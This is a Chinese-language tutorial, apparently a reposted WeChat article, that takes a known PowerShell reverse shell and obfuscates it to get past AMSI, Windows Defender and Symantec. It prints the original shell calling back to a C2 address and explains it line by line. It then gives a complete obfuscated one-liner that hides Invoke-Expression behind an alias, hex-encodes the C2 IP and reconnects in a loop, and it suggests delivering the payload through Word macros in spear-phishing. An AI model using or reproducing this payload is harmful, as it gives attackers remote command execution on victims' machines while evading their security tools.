> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/bxxLtYAsCDTY_QImlhkaTQ)

[![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdFx7R9FpawK77W0zPoUd00PDNnybBHvlxMYrWia3ElQ7uibnUCk6rUjY2Ee73DY2U6uFul3LDO9Vpw/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&mid=2247494461&idx=1&sn=2c4d86a41041df8970eb58b8d6e4be4f&chksm=ec1ddb15db6a5203313fdda2545255d801111c1a10475bdedb425b0017417c63cad6b1ab0a07&scene=21#wechat_redirect)

这篇文章将是关于通过 PowerShell 混淆来规避大多数 AV。这不是什么新鲜事，但很多人问我如何真正隐藏，或者如何混淆现有的有效载荷或 PowerShell 的反向外壳，这些负载已经可以检测到。  

因此，我决定采用一个已知的 PowerShell 反向外壳，该外壳被 Defender 和赛门铁克端点保护归类为恶意的，因为这两个是大多数组织依赖的一些常见 AV），我会混淆它们，使其无法检测到。另请注意，这种混淆不仅适用于有效载荷，而且您可以使用以下技术混淆现有工具，如 PowerSploit、PowerView 来规避 AV 和 EDR。这就是 PowerShell 的美。

有效载荷
----

我将使用以下有效载荷进行从这里下载：

> https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1

```
$client = New-Object System.Net.Sockets.TCPClient('192.168.56.1',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

现在，如果您在端口 8080 上启动 netcat 监听器，并在启用 Win Defender 或任何其他 AV 的情况下将上述代码输入 PowerShell，它将被标记为恶意代码，如下图所示。  

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdPfUrbQvOKmr2UY5IiakdjMJiaiaMmQ6sejwBY0gkLk8zxwvdbT0kkP3pI16bkGR87rmqOSu1OUicHKg/640?wx_fmt=png)

检测到恶意的 PowerShell 有效负载

现在，我们的任务是确保这个有效载荷不会被标记。我们先把上面的有效载荷逐块剖析，了解代码。

1、在所需的主机 / 端口上创建一个 TCP 套接字。

```
$client = New-Object System.Net.Sockets.TCPClient('192.168.56.1',8080)
```

2、在上述套接字上创建一个流进行输入和输出。  

```
$stream = $client.GetStream()
```

3、上述流将用于将每个 ASCII/UNICODE 字符转换为可以通过网络发送的字节。

```
[byte[]]$bytes = 0..65535|%{0}
```

4、创建一个循环，为通过网络发送的每个输入接收或输出进行连续读写。虽然收到的字节不等于零，但请通过套接字连续读取，以便从服务器输入。

```
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ ... }
```

5、从客户端获取数据。  

```
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
```

6、**iex** 是调用函数的 PowerShell 别名。在这里，**iex 在**数据变量中执行代码，将其转换为字符串，而错误则重定向到空值，然后将其存储在 **$sendback** 变量中。  

```
$sendback = (iex $data 2>&1 | Out-String )
```

7、现在，当前的 PowerShell 路径附加到 **$sendback2** 变量中创建的字符串。  

```
$sendback2  = $sendback + 'PS ' + (pwd).Path + '> '
```

8、变量中的上述字符串转换为套接字可读字节。  

```
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
```

9、上述字节写在流套接字上。  

```
$stream.Write($sendbyte,0,$sendbyte.Length)
```

10、所有字节都刷新到屏幕上。  

```
$stream.Flush()
```

11、while 循环关闭后关闭套接字。  

```
$client.Close()
```

逃避  

-----

现在有趣的部分来了。Windows 使用 AMSI（反恶意软件扫描接口）检测恶意有效负载。现在，对于检测 PowerShell 部分，AMSI 使用基于字符串的检测。

现在，由于上述有效载荷在网络上非常有名，因此很容易创建用于检测上述有效载荷的 YARA 规则。大多数人试图通过将上述代码转换为 base64 来混淆它，但这不行。

因为 AMSI 可以直接检测到 base64 以外的恶意字符串，也可以轻松解码 base64 并检测 PowerShell 命令中使用的字符串。

现在，这里的诀窍是将上述每个命令分别混淆，而不是将它们全部编码在一起。这对规避有效原因是，如果我们拆开有效负载并将其每个有效负载键入到 PowerShell 终端中，它不会被标记为恶意，因为它们都被归类为不同的命令，这些命令是 PowerShell 的合法命令。但是，如果我们把它们缝合在一起，那么脚本就作为一个有效负载，可以很容易地使用 YARA 或基于字符串的检测来检测。所以简单来说，我们的任务是以下步骤：

1.  打破有效载荷
    
2.  混淆每条命令行
    
3.  缝合有效载荷
    
4.  对有效载荷进行编码
    

我们已经分解了上面的有效载荷。现在是时候混淆每个命令了。对于混淆部分，我们将使用从环境变量到内置 PowerShell 命令的所有功能。此外，让我们只需将 TCP 套接字更改为自定义 HTTP 连接，以防我们需要在 Word 宏中使用这些有效负载进行 Spear 钓鱼活动。

首先，让我们混淆 IP 地址为简单的十六进制。我的 C2 主机 IP 是 192.168.56.1，转为 16 进制时 192 = c0，168 = a8，56 = 38，1 = 1

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdPfUrbQvOKmr2UY5IiakdjMKuHNbMPrfpd9oHydjPE6817DicecMRGdt9o2TC60MAEAZeMODcLiaUxw/640?wx_fmt=png)

现在，我们将在 PowerShell 的运行时解码它。因此，将此转换为 IP 的代码如下。在这里，我将 IP 的十六进制存储在 **$px** 变量中，然后将其转换为 IP 并将其存储在 **$p** 变量中。

```
$px = "c0","a8","38","1"
$p = ($px | ForEach { [convert]::ToInt32($_,16) }) -join '.'
```

接下来，我们将 HTTP 请求设置一个简单的 GET 请求。确保不要忘记回车符 `\r\n`。否则它不会作为 HTTP 请求。此外，与其使用别名 **text.encoding** 进行字节转换，不如使用原生函数 **[System.Text.ASCIIEncoding] 将**字符串转换为字节的 API。我们将把字节存储在 **$b** 变量中，并将 API **[System.Text.ASCIIEncoding] 存储**在 $s 变量中。我们稍后将使用此进行字节转换。  

```
$w = "GET /index.html HTTP/1.1`r`nHost: $p`r`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0`r`nAccept: text/html`r`n`r`n"
$s = [System.Text.ASCIIEncoding]
[byte[]]$b = 0..65535|%{0}
```

现在，绕过 IEX 的主要任务来了，即 Invoke-Expression 命令。如果你以前玩过 EDR，那么众所周知，这是 IEX 的全名。默认情况下，调用表达式总是被标记为恶意的，因为它用于执行命令。因此，我们将确保有效负载中不存在任何字符串或任何编码版本的 IEX，但我们仍将使用此命令。记住，IEX 本身不是恶意的。它和任何其他微软 API 一样好。只是与 IEX 命令一起使用的字符串将其标记为恶意软件。现在，为了做到这一点，让我们在这里随机选择一个字符串：  

```
$x = "n-eiorvsxpk5"
```

现在上面的代码看起来是乱码。但是，我们将用它来做很多混淆。**$x** 存储一个带有随机字符串的简单变量。现在，这个字符串不能标记为恶意字符串，因为它可以是任何随机字符串，也不能有任何 YARA 规则来检测随机字符串。我们将做的是，使用这个字符串来制作我们的 IEX 命令。这就是我们要怎么做：  

```
Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158])
```

下面我们来剖析一下上面的代码。我们将把它分成四个部分：  

```
1. Set-alias $x
2. $x[$true-10]
3. ($x[[byte]("0x" + "FF") - 265])
4. $x[[byte]("0x" + "9a") - 158])
```

让我们先讨论第 2、3 和第 4 点。**$true** 在数字上是 1。因此，**$true-10** 变成了 **-9**。由于 **$x** 是一个字符串，我们可以从 **$x** 变量中提取 **-9** 个字符，该字符来自：  

> **$x[-9] = i**

接下来，**“0x”+“FF”** 表示 **0xFF**，这是使用 **[字节]** 转换为字节的类型。0xFF 在数字中代表 255。因此，255**-265 = -10**，如下：

> **$x[-10] = e**

同样，第 4 点计算出来的是 **-4**，即：

> **$x[-4] = x**

因此，将上述内容串联起来，我们得到了 **ex**。使用 **Set-Alias**，我们将命令 **IEX** 分配给 **$x**，这意味着 **IEX** 别名。**Invoke-Expression** 成为我们的随机字符串，即 “**n-eiorvsxpk5**”。因此，现在我们可以使用 **n-eiorvsxpk5** 表达式执行任何命令。下面的截图应该可以更好地解释这一点：

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdPfUrbQvOKmr2UY5IiakdjMNJxHFSnTeu6xp9QvOkyIpnQxW5YQyh5WMlicNWnkW5AgSv8uIfex1Qw/640?wx_fmt=png)

或者，如果您不想为 I、E 和 X 使用相同风格的编码，您也可以使用不同的模式。例如，我们可以通过以下操作来混淆从 IEX 中提取 X：

```
Set-alias $x ($x[$true-10] + ($x[[byte]('0x' + 'FF') - 265]) + $x[$false - [int]([Datetime]::Today).ToString().Split("/")[2].Split(" ")[0] + 2015])
```

在计算完之后，我们可以使用 **-4** 作为下标 ，**x[-4]** 作为提取的字符串，得到字符串 **x**。

现在你在上面看到的是一个非常简单的混淆。唯一的限制是你的创造性思维。接下来，我们继续使用我们之前解码的 **$p** 变量创建一个套接字，该变量包含 IP 和我们的端口。我现在还没有混淆端口，因为现在你应该已经知道如何混淆了。此外，我们将在 **$z** 变量中为我们的套接字设置输入输出流：

```
$y = New-Object System.Net.Sockets.TCPClient($p,80)
$z = $y.GetStream()
```

接下来，我们将上面创建的数据（带有 GET 请求的用户代理字符串）转换为字节，并将其存储在变量 **$d** 中，并使用我们上面创建的输出流将其写入服务器。现在同样，我们等待来自服务器的任何输入，在收到任何输入时，它使用 **n-eiorvsxpk5** 执行命令，即 **Invoke-Expression**，将其转换为字节并发送回。  

```
$d = $s::UTF8.GetBytes($w)
$z.Write($d, 0, $d.Length)
$t = (n-eiorvsxpk5 whoami) + "$ "
while(($l = $z.Read($b, 0, $b.Length)) -ne 0){
    $v = (New-Object -TypeName $s).GetString($b,0, $l)
    $t = (&"whoami") + "$ "
    $d = $s::UTF8.GetBytes((n-eiorvsxpk5 $v 2>&1 | Out-String )) + $s::UTF8.GetBytes($t)
    $z.Write($d, 0, $d.Length)
}
$y.Close()
```

您在上面可以看到的另一件事是，我正在附加命令的输出，将其存储在 **$t** 变量中，并与网络上的每个数据一起发送。此外，一旦从服务器收到零字节，我们最终会关闭套接字。最后，我们将整个有效负载与 sleep 命令一起放入一个短短的真循环中，这样即使我们的连接中断，它也会 sleep X 秒，然后尝试重新连接到我们的服务器。最终代码就是这个样子：  

```
while ($true) {
    $px = "c0","a8","38","1"
    $p = ($px | ForEach { [convert]::ToInt32($_,16) }) -join '.'
    $w = "GET /index.html HTTP/1.1`r`nHost: $p`r`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0`r`nAccept: text/html`r`n`r`n"
    $s = [System.Text.ASCIIEncoding]
    [byte[]]$b = 0..65535|%{0}
    $x = "n-eiorvsxpk5"
    Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158])
    $y = New-Object System.Net.Sockets.TCPClient($p,80)
    $z = $y.GetStream()
    $d = $s::UTF8.GetBytes($w)
    $z.Write($d, 0, $d.Length)
    $t = (n-eiorvsxpk5 whoami) + "$ "
    while(($l = $z.Read($b, 0, $b.Length)) -ne 0){
        $v = (New-Object -TypeName $s).GetString($b,0, $l)        
        $d = $s::UTF8.GetBytes((n-eiorvsxpk5 $v 2>&1 | Out-String )) + $s::UTF8.GetBytes($t)
        $z.Write($d, 0, $d.Length)
    }
    $y.Close()
    Start-Sleep -Seconds 5
}
```

现在你们中的一些人可能想知道，为什么我没有混淆代码的其余部分，而是更专注于 IEX 部分。原因是当你剥离整个代码并在 PowerShell 中逐一执行它们时，您将意识到 **IEX** 是由 AMSI 标记的部分，而不是任何其他部分。但请随意混淆有效载荷的其余部分。以下是上述 payload 的完整变形：  

```
while ($true) {$px = "c0","a8","38","1";$p = ($px | ForEach { [convert]::ToInt32($_,16) }) -join '.';$w = "GET /index.html HTTP/1.1`r`nHost: $p`r`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0`r`nAccept: text/html`r`n`r`n";$s = [System.Text.ASCIIEncoding];[byte[]]$b = 0..65535|%{0};$x = "n-eiorvsxpk5";Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158]);$y = New-Object System.Net.Sockets.TCPClient($p,80);$z = $y.GetStream();$d = $s::UTF8.GetBytes($w);$z.Write($d, 0, $d.Length);$t = (n-eiorvsxpk5 whoami) + "$ ";while(($l = $z.Read($b, 0, $b.Length)) -ne 0){;$v = (New-Object -TypeName $s).GetString($b,0, $l);$d = $s::UTF8.GetBytes((n-eiorvsxpk5 $v 2>&1 | Out-String )) + $s::UTF8.GetBytes($t);$z.Write($d, 0, $d.Length);}$y.Close();Start-Sleep -Seconds 5}
```

最后，我们针对 AMSI 进行了测试。正如您在下面看到的，病毒库已更新到最新版本。它仍然阻止默认有效负载，但当我们使用自定义有效负载时，它会绕过 AMSI。

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdPfUrbQvOKmr2UY5IiakdjMPLkTfmJyniamkTzN6SoZBJ2TWqdqc8lHmFCDiaT6wKcwS3JAoNewjadg/640?wx_fmt=png)